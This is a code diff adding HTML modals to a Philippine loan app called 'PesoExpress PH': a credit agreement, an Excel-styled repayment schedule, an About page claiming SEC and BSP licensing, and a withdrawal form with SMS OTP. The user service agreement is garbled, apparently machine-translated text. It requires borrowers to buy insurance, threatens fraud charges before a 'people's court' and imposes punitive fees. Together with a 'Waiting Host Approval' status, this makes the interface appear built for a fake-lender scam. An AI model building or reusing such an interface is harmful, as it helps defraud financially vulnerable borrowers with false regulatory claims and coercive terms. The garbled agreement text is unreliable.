+                <div style="background: #f8fafc; border: 1px dashed #cbd5e1; border-radius: 8px; padding: 1rem; margin-bottom: 1rem;">
+                    <div style="text-align: center; margin-bottom: 0.75rem;">
+                        <span style="font-size: 0.75rem; font-weight: 800; color: var(--text-muted); letter-spacing: 1px;">REPUBLIC OF THE PHILIPPINES</span>
+                        <h4 style="font-size: 0.95rem; font-weight: 800; color: var(--text-dark); margin-top: 0.1rem;">CREDIT FINANCING AGREEMENT</h4>
+                        <span style="font-size: 0.7rem; color: var(--primary-color); font-weight: 700;">SEC Reg. CS202109841 • CA No. 3482</span>
+                    </div>
+                    <hr style="border: 0; border-top: 1px solid #e2e8f0; margin: 0.75rem 0;">
+                    <div style="font-size: 0.82rem; line-height: 1.6; color: var(--text-main);">
+                        <div style="display: flex; justify-content: space-between;"><strong>Contract ID:</strong> <span id="contractIdVal">PX-2026-8841</span></div>
+                        <div style="display: flex; justify-content: space-between;"><strong>Borrower:</strong> <span id="contractBorrowerVal">Juan Dela Cruz</span></div>
+                        <div style="display: flex; justify-content: space-between;"><strong>Approved Loan:</strong> <span id="contractAmountVal" style="color: var(--primary-color); font-weight: 800;">₱ 50,000</span></div>
+                        <div style="display: flex; justify-content: space-between;"><strong>Interest Rate:</strong> <span>0.83% / month</span></div>
+                        <div style="display: flex; justify-content: space-between;"><strong>Disbursement Status:</strong> <span id="contractStatusVal" style="font-weight: 700;">Active</span></div>
+                    </div>
+                </div>
+                <div style="font-size: 0.78rem; color: var(--text-muted); line-height: 1.4; background: #fff; border: 1px solid #e2e8f0; padding: 0.75rem; border-radius: 6px;">
+                    <strong>Legal Terms Summary:</strong><br>
+                    This Agreement is electronically executed pursuant to Republic Act No. 8792 (Electronic Commerce Act of 2000). The borrower agrees to repay the approved principal amount plus applicable charges in accordance with the agreed payment schedule.
+                </div>
+                <div style="margin-top: 0.85rem; padding: 0.75rem; background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; text-align: center;">
+                    <span style="display: block; font-size: 0.75rem; font-weight: 700; color: var(--text-muted); margin-bottom: 0.25rem;">VERIFIED BORROWER DIGITAL SIGNATURE</span>
+                    <img id="contractSignatureImg" style="max-height: 50px; max-width: 200px; display: inline-block; object-fit: contain;" alt="Digital Signature">
+                </div>
+            </div>
+            <div style="display: flex; gap: 0.75rem;">
+                <button class="btn btn-outline btn-block" onclick="downloadContractPDF()">Download PDF</button>
+                <button class="btn btn-primary btn-block" onclick="closeLoanContractModal()">Close</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAYMENT SCHEDULE MODAL (EXCEL TABLE FORMAT) -->
+    <div id="paymentScheduleModal" class="modal-overlay">
+        <div class="modal-content" style="max-width: 560px; padding: 1.5rem; text-align: left;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem;">
+                <h3 style="color: var(--primary-blue); font-size: 1.15rem; display: flex; align-items: center; gap: 0.4rem;">Repayment Schedule (Excel Sheet)</h3>
+                <span class="close-modal" onclick="closePaymentScheduleModal()">&times;</span>
+            </div>
+            
+            <div style="background: #ecfdf5; border: 1px solid #a7f3d0; border-radius: 8px; padding: 0.85rem; margin-bottom: 1rem; display: flex; justify-content: space-between; align-items: center;">
+                <div>
+                    <span style="font-size: 0.75rem; color: #047857; font-weight: 700; text-transform: uppercase;">Total Repayment Amount</span>
+                    <h4 id="schedTotalRepayVal" style="font-size: 1.15rem; font-weight: 800; color: #065f46;">₱ 52,490</h4>
+                </div>
+                <div style="text-align: right;">
+                    <span style="font-size: 0.75rem; color: #047857; font-weight: 700; text-transform: uppercase;">Monthly Dues</span>
+                    <h4 id="schedMonthlyVal" style="font-size: 1.15rem; font-weight: 800; color: #065f46;">₱ 4,374 /mo</h4>
+                </div>
+            </div>
+
+            <!-- EXCEL RIBBON & SPREADSHEET CONTAINER -->
+            <div style="border: 1px solid #107c41; border-radius: 8px; overflow: hidden; margin-bottom: 1.25rem; box-shadow: 0 2px 8px rgba(0,0,0,0.06);">
+                <div style="background: #107c41; color: white; padding: 0.5rem 0.85rem; font-size: 0.8rem; font-weight: 700; display: flex; justify-content: space-between; align-items: center;">
+                    <span style="display: flex; align-items: center; gap: 0.4rem;">Microsoft Excel - Repayment_Schedule.xlsx</span>
+                    <span style="font-size: 0.7rem; background: rgba(255,255,255,0.2); padding: 0.15rem 0.5rem; border-radius: 4px;">Sheet1</span>
+                </div>
+                <div style="max-height: 52vh; overflow-y: auto; overflow-x: auto; background: #fff;">
+                    <table style="width: 100%; border-collapse: collapse; font-size: 0.78rem; text-align: left; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
+                        <thead>
+                            <tr style="background: #f3f4f6; color: #374151; font-weight: 800; position: sticky; top: 0; z-index: 10; border-bottom: 2px solid #cbd5e1;">
+                                <th style="padding: 0.5rem 0.4rem; border: 1px solid #d1d5db; text-align: center; width: 40px; background: #e5e7eb;">A</th>
+                                <th style="padding: 0.5rem; border: 1px solid #d1d5db;">B (Due Date)</th>
+                                <th style="padding: 0.5rem; border: 1px solid #d1d5db; text-align: right;">C (Principal)</th>
+                                <th style="padding: 0.5rem; border: 1px solid #d1d5db; text-align: right;">D (Interest)</th>
+                                <th style="padding: 0.5rem; border: 1px solid #d1d5db; text-align: right;">E (Total Due)</th>
+                                <th style="padding: 0.5rem; border: 1px solid #d1d5db; text-align: center;">F (Status)</th>
+                            </tr>
+                        </thead>
+                        <tbody id="schedTableTbody">
+                            <!-- Dynamically generated rows -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            
+            <div style="display: flex; gap: 0.75rem;">
+                <button class="btn btn-outline" style="flex: 1; display: flex; align-items: center; justify-content: center; gap: 0.4rem; border-color: #107c41; color: #107c41; font-weight: 700;" onclick="downloadPaymentScheduleCSV()">Download Excel (.csv)</button>
+                <button class="btn btn-primary" style="flex: 1;" onclick="closePaymentScheduleModal()">Close Schedule</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- TRANSACTIONS HISTORY MODAL -->
+    <div id="transactionsModal" class="modal-overlay">
+        <div class="modal-content" style="max-width: 460px; padding: 1.5rem; text-align: left;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem;">
+                <h3 style="color: var(--primary-blue); font-size: 1.15rem; display: flex; align-items: center; gap: 0.4rem;">Account Transactions</h3>
+                <span class="close-modal" onclick="closeTransactionsModal()">&times;</span>
+            </div>
+            <div style="max-height: 60vh; overflow-y: auto; padding-right: 0.25rem; margin-bottom: 1.25rem;">
+                <div id="txListContainer" style="display: flex; flex-direction: column; gap: 0.75rem;">
+                    <!-- Dynamically generated transactions -->
+                </div>
+            </div>
+            <button class="btn btn-primary btn-block" onclick="closeTransactionsModal()">Close</button>
+        </div>
+    </div>
+
+    <!-- ABOUT US MODAL -->
+    <div id="aboutUsModal" class="modal-overlay">
+        <div class="modal-content" style="max-width: 440px; padding: 1.5rem; text-align: left;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem;">
+                <h3 style="color: var(--primary-blue); font-size: 1.15rem; display: flex; align-items: center; gap: 0.4rem;">About PesoExpress PH</h3>
+                <span class="close-modal" onclick="closeAboutUsModal()">&times;</span>
+            </div>
+            <div style="text-align: center; margin-bottom: 1.25rem;">
+                <div style="width: 60px; height: 60px; border-radius: 50%; background: #00b359; color: white; display: flex; align-items: center; justify-content: center; font-size: 2rem; font-weight: 900; margin: 0 auto 0.75rem auto;">₱</div>
+                <h4 style="font-size: 1.1rem; font-weight: 800; color: var(--text-dark);">PesoExpress Philippines</h4>
+                <span style="font-size: 0.8rem; background: #e0f2fe; color: #0369a1; padding: 0.2rem 0.6rem; border-radius: 12px; font-weight: 700;">Version 2.4.0 (Build 2026)</span>
+            </div>
+            <div style="font-size: 0.82rem; color: var(--text-main); line-height: 1.6; margin-bottom: 1.25rem;">
+                <div style="background: #f8fafc; padding: 0.85rem; border-radius: 8px; border: 1px solid #e2e8f0; margin-bottom: 0.75rem;">
+                    <strong>Regulatory Information:</strong><br>
+                    Licensed by the Securities and Exchange Commission (SEC Registration CS202109841) and regulated by the Bangko Sentral ng Pilipinas (BSP).
+                </div>
+                <div style="background: #f8fafc; padding: 0.85rem; border-radius: 8px; border: 1px solid #e2e8f0;">
+                    <strong>Customer Support:</strong><br>
+                    • Hotline: (02) 8888-PESO (7376)<br>
+                    • Email: support@pesoexpress.ph<br>
+                    • Operating Hours: Mon - Fri (8:00 AM - 6:00 PM)
+                </div>
+            </div>
+            <button class="btn btn-primary btn-block" onclick="closeAboutUsModal()">Close</button>
+        </div>
+    </div>
+
+    <!-- USER SERVICE AGREEMENT MODAL -->
+    <div id="userServiceAgreementModal" class="modal-overlay">
+        <div class="modal-content" style="max-width: 520px; padding: 1.5rem; text-align: left; border-radius: 16px;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem;">
+                <h3 style="color: var(--primary-blue); font-size: 1.15rem; display: flex; align-items: center; gap: 0.4rem;">User Service Agreement</h3>
+                <span class="close-modal" onclick="closeUserServiceAgreementModal()">&times;</span>
+            </div>
+            <div style="max-height: 65vh; overflow-y: auto; padding-right: 0.5rem; margin-bottom: 1.25rem; font-size: 0.82rem; line-height: 1.6; color: var(--text-main);">
+                <p style="font-weight: 700; color: var(--text-dark);">“Installment Agreement”, the Lender and the Borrower agree to and jointly abide by this Agreement. Adhering to the principles of equity, voluntary, honesty and reputation, there is no consensus, this small loan agreement is signed and ensures compliance and performance by the parties.</p>
+                
+                <h4 style="font-size: 0.9rem; font-weight: 800; color: var(--text-dark); margin-top: 1rem;">Article 1 - Loan Form</h4>
+                <p>Use an unsecured ID card to request a loan.</p>
+
+                <h4 style="font-size: 0.9rem; font-weight: 800; color: var(--text-dark); margin-top: 1rem;">Article 2 - Premium interest rate</h4>
+                <p>Interest rates, fines, service charges or any fees.</p>
+
+                <h4 style="font-size: 0.9rem; font-weight: 800; color: var(--text-dark); margin-top: 1rem;">Article 3 - Obligations During Loan Tenure</h4>
+                <p>During the loan tenure, the borrower has to:<br>
+                (1) Pay interest at the same time.<br>
+                (2) To give capital on time.<br>
+                (3) If it is not possible to borrow money from the account due to the borrower's problem, the borrower should cooperate with the lender to finalize the payment.<br>
+                (4) Comply with all the terms of the contract.</p>
+
+                <h4 style="font-size: 0.9rem; font-weight: 800; color: var(--text-dark); margin-top: 1rem;">Article 4 - Terms & Compliance</h4>
+                <p>(1) In case the borrower borrows online without using collateral, the lender is at risk of lending. The borrower must have a loan guarantee to check the liquidity of the borrower's personal loan minimum repayment.<br>
+                (2) In case the borrower borrows online without using collateral, the lender is at risk of lending. The borrower is required to provide clear documentation when requesting the loan to ensure protection for both parties involved.<br>
+                (3) After signing this contract, both the borrower and the lender must comply with all requirements of the contract. If either party breaches the contract, the other party has the right to sue in court. The party not complying with this will have to pay a fine of 50 percent of the installment amount if it does not object.<br>
+                (4) In the event that the credit transfer cannot be resolved due to the problems of the borrower, the lender has the right to request the borrower to assist in handling it. After completing this operation, the lender has to transfer the funds.<br>
+                (5) The borrower shall repay the loan principal and interest within the period specified in the contract. If the borrower wants to apply for loan extension, he/she has to disburse it 5 days before the contract period.<br>
+                (6) If the borrower does not repay on time on the stipulated repayment date, penalty interest will be calculated after three days at 0.5% per day.</p>
+
+                <h4 style="font-size: 0.9rem; font-weight: 800; color: var(--text-dark); margin-top: 1rem;">Article 5 - Lending Decision</h4>
+                <p>Lending: Before granting a loan, the lender has the right to consider the following matters and take a decision to grant the loan as a result of the review:<br>
+                (1) The Borrower has entered into this Agreement Completion of legal formalities (if any) relating to the loan under the Act, such as regulatory delivery of government permits, approvals, registrations and relevant laws.<br>
+                (2) Whether the Borrower has paid the costs associated with this Agreement (if any).<br>
+                (3) Whether the borrower has complied with the loan terms specified in this Agreement.<br>
+                (4) Whether the business and financial position of the borrower has changed adversely.<br>
+                (5) If the Borrower breaches the terms specified in this Agreement.</p>
+
+                <h4 style="font-size: 0.9rem; font-weight: 800; color: var(--text-dark); margin-top: 1rem;">Article 6 - Legal Consequences</h4>
+                <p>(1) The borrower cannot use the loan for illegal activities. Otherwise, the Lender reserves the right to require the Borrower to repay the principal and interest promptly and the legal consequences shall be borne by the Borrower.<br>
+                (2) The borrower shall repay the principal and interest within the period specified in the contract. For the overdue portion, the lender is entitled to recover the loan and collect 5% of the total amount due.</p>
+
+                <h4 style="font-size: 0.9rem; font-weight: 800; color: var(--text-dark); margin-top: 1rem;">Article 7 - Modification or Termination</h4>
+                <p>Modification or termination of contract: In all of the above provisions, neither party is permitted to modify or terminate the contract without permission. When either party wishes to bring to the fore such facts in accordance with the provisions of the law, he must notify the other party in writing in time for the settlement. After this Agreement is modified or terminated, the Borrower shall repay 30% to the principal and interest in accordance with the terms of this Agreement.</p>
+
+                <h4 style="font-size: 0.9rem; font-weight: 800; color: var(--text-dark); margin-top: 1rem;">Article 8 - Dispute Resolution</h4>
+                <p>Dispute Resolution: Both parties agree to amend the terms of this Agreement through negotiation. If the negotiations do not agree, you can ask the local arbitration committee to mediate or bring the matter to a local court.</p>
+
+                <h4 style="font-size: 0.9rem; font-weight: 800; color: var(--text-dark); margin-top: 1rem;">Article 9 - Credit Risk & Insurance</h4>
+                <p>The lender assumes the credit risk of the borrower. Due to the "new corona pandemic", the central office requires borrowers to purchase personal accident insurance. If the borrower is unable to repay the loan on time due to force mature, the lender may ask the insurance company to assist in the payment of the borrower's loan and the loan should be transferred to the borrower's account. Borrowing is specified in the internal contract. Half an hour after the purchase, if the borrower signs the contract but does not comply with the terms, the company considers it a serious fraud and will take the credit dispute to the people's court. The anti-contract king is also presented. After purchase, if the lender does not lend on time, the borrower has the right to sue directly in the local court.</p>
+
+                <h4 style="font-size: 0.9rem; font-weight: 800; color: var(--text-dark); margin-top: 1rem;">Article 10 - Effective Date</h4>
+                <p>This short loan agreement takes effect from the date of its signing by both parties (including the electronic agreement). The text of the contract has the same legal effect. The lender and borrower keep a copy of the contract.</p>
+                <p style="font-weight: 700; margin-top: 1rem;">Lender: Credit</p>
+            </div>
+            <button class="btn btn-primary btn-block" onclick="closeUserServiceAgreementModal()">I Understand & Agree</button>
+        </div>
+    </div>
+
+    <!-- LOAN CONFIRMATION DIALOG MODAL (MATCHING SCREENSHOT 3) -->
+    <div id="loanConfirmDialogModal" class="modal-overlay">
+        <div class="modal-content" style="max-width: 340px; padding: 1.5rem; text-align: center; border-radius: 16px;">
+            <div style="width: 60px; height: 60px; border-radius: 50%; background: #fef3c7; color: #d97706; display: flex; align-items: center; justify-content: center; font-size: 2.2rem; font-weight: 900; margin: 0 auto 0.75rem auto;">!</div>
+            <h3 style="font-size: 1.2rem; font-weight: 800; color: #111827; margin-bottom: 0.75rem;">Confirm</h3>
+            <p id="loanConfirmDialogMsg" style="font-size: 0.9rem; color: #4b5563; margin-bottom: 1.5rem; line-height: 1.4;">Agree to borrow 80,000PHP term 6 months?</p>
+            <div style="display: flex; gap: 0.75rem;">
+                <button class="btn" style="flex: 1; background: #ef4444; color: white; font-weight: 800;" onclick="closeLoanConfirmDialog()">CANCEL</button>
+                <button class="btn" style="flex: 1; background: #10b981; color: white; font-weight: 800;" onclick="proceedToIdentifyScreen()">AGREE</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- WITHDRAWAL REQUEST & OTP VERIFICATION MODAL -->
+    <div id="withdrawalModal" class="modal-overlay">
+        <div class="modal-content" style="max-width: 460px; padding: 1.5rem; text-align: left;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem;">
+                <h3 style="color: var(--primary-blue); font-size: 1.15rem; display: flex; align-items: center; gap: 0.4rem;">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+                    Disbursement & Withdrawal
+                </h3>
+                <span class="close-modal" onclick="closeWithdrawalModal()">&times;</span>
+            </div>
+
+            <div style="background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 0.85rem 1rem; margin-bottom: 1.25rem;">
+                <div style="display: flex; justify-content: space-between; align-items: center; font-size: 0.82rem;">
+                    <span style="color: var(--text-muted); font-weight: 600;">Payout Account:</span>
+                    <strong id="withdrawAccountDisplay" style="color: var(--text-dark); font-weight: 800;">GCash</strong>
+                </div>
+                <div style="display: flex; justify-content: space-between; align-items: center; font-size: 0.82rem; margin-top: 0.3rem;">
+                    <span style="color: var(--text-muted); font-weight: 600;">Available Balance:</span>
+                    <strong id="withdrawMaxDisplay" style="color: var(--accent-green); font-weight: 800;">₱ 0</strong>
+                </div>
+            </div>
+
+            <form onsubmit="confirmWithdrawalRequest(event)">
+                <!-- 1. Typeable Withdrawal Amount Input -->
+                <div class="form-group" style="margin-bottom: 1.25rem;">
+                    <label style="display: block; margin-bottom: 0.4rem; font-weight: 700; font-size: 0.85rem; color: var(--text-dark);">Withdrawal Amount (PHP)</label>
+                    <div style="display: flex; align-items: center; background: #fff; border: 2px solid #cbd5e1; border-radius: 10px; padding: 0.6rem 0.85rem;">
+                        <span style="color: var(--primary-blue); font-weight: 900; font-size: 1.15rem; margin-right: 0.5rem;">₱</span>
+                        <input type="number" id="withdrawAmountInput" min="100" step="100" class="form-control" style="border: none; background: transparent; font-size: 1.15rem; font-weight: 800; color: #0f172a; outline: none; padding: 0;" placeholder="Enter amount to withdraw" required>
+                    </div>
+                </div>
+
+                <!-- 2. SMS OTP Verification -->
+                <div class="form-group" style="margin-bottom: 1.25rem;">
+                    <label style="display: block; font-weight: 700; font-size: 0.85rem; color: var(--text-dark); margin-bottom: 0.4rem;">
+                        SMS Verification Code (OTP)
+                    </label>
+                    <div style="display: flex; gap: 0.5rem;">
+                        <input type="text" id="withdrawOtpInput" maxlength="6" class="form-control" placeholder="6-digit OTP code" style="flex: 1; font-weight: 800; letter-spacing: 2px; text-align: center; font-size: 1.05rem;" required>
+                        <button type="button" id="sendOtpBtn" class="btn btn-secondary" onclick="requestWithdrawalOtp()" style="white-space: nowrap; font-size: 0.8rem; padding: 0.6rem 0.85rem; font-weight: 700; background: #0284c7; color: white; border: none;">Confirm OTP code</button>
+                    </div>
+                    <div id="otpNoticeMsg" style="font-size: 0.75rem; color: #059669; font-weight: 700; margin-top: 0.35rem; display: none;"></div>
+                </div>
+
+                <div id="withdrawError" style="color: var(--danger-color); font-size: 0.85rem; margin-bottom: 1rem; display: none;"></div>
+
+                <div style="display: flex; gap: 0.75rem;">
+                    <button type="button" class="btn btn-secondary" style="flex: 1;" onclick="closeWithdrawalModal()">Cancel</button>
+                    <button type="submit" class="btn btn-primary" style="flex: 2; font-weight: 800; background: #10b981; border: none;">CONFIRM WITHDRAWAL</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- CONGRATULATIONS SUCCESS MODAL -->
+    <div id="congratsModal" class="modal-overlay">
+        <div class="modal-content" style="max-width: 420px; padding: 2rem 1.5rem; text-align: center; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.2);">
+            <div style="width: 80px; height: 80px; border-radius: 50%; background: linear-gradient(135deg, #10b981 0%, #059669 100%); color: white; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.25rem auto; box-shadow: 0 8px 20px rgba(16,185,129,0.35);">
+                <svg width="42" height="42" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            </div>
+            
+            <h2 style="font-size: 1.5rem; font-weight: 900; color: #111827; margin-bottom: 0.4rem;">Congratulations!</h2>
+            <p style="font-size: 0.88rem; color: #4b5563; margin-bottom: 1.5rem; line-height: 1.5;">Your loan application has been successfully submitted and is now under official review.</p>
+
+            <div style="background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 12px; padding: 1rem; margin-bottom: 1.5rem; text-align: left; font-size: 0.85rem;">
+                <div style="display: flex; justify-content: space-between; margin-bottom: 0.5rem;">
+                    <span style="color: #64748b; font-weight: 600;">Requested Amount:</span>
+                    <strong style="color: var(--primary-blue);" id="congratsAmt">₱ 0</strong>
+                </div>
+                <div style="display: flex; justify-content: space-between; margin-bottom: 0.5rem;">
+                    <span style="color: #64748b; font-weight: 600;">Payout Account:</span>
+                    <strong style="color: #1e293b;" id="congratsBank">GCash</strong>
+                </div>
+                <div style="display: flex; justify-content: space-between; margin-bottom: 0.5rem;">
+                    <span style="color: #64748b; font-weight: 600;">Application Ref:</span>
+                    <span style="font-family: monospace; font-weight: 700; color: #0f172a;" id="congratsRef">#APP-001</span>
+                </div>
+                <div style="display: flex; justify-content: space-between; align-items: center; pt: 0.4rem; border-top: 1px dashed #cbd5e1; margin-top: 0.5rem;">
+                    <span style="color: #64748b; font-weight: 600;">Review Status:</span>
+                    <span style="background: #fef3c7; color: #d97706; padding: 0.2rem 0.6rem; border-radius: 12px; font-size: 0.75rem; font-weight: 800;">Waiting Host Approval</span>
+                </div>
+            </div>
+
+            <div style="display: flex; flex-direction: column; gap: 0.75rem;">
+                <button class="btn btn-primary btn-block" style="padding: 0.85rem; font-size: 1rem; font-weight: 800; border-radius: 12px;" onclick="closeCongratsModalAndGoWallet()">Check Account Balance & Wallet &rarr;</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="app.js?v=44.0"></script>
 </body>
 </html>
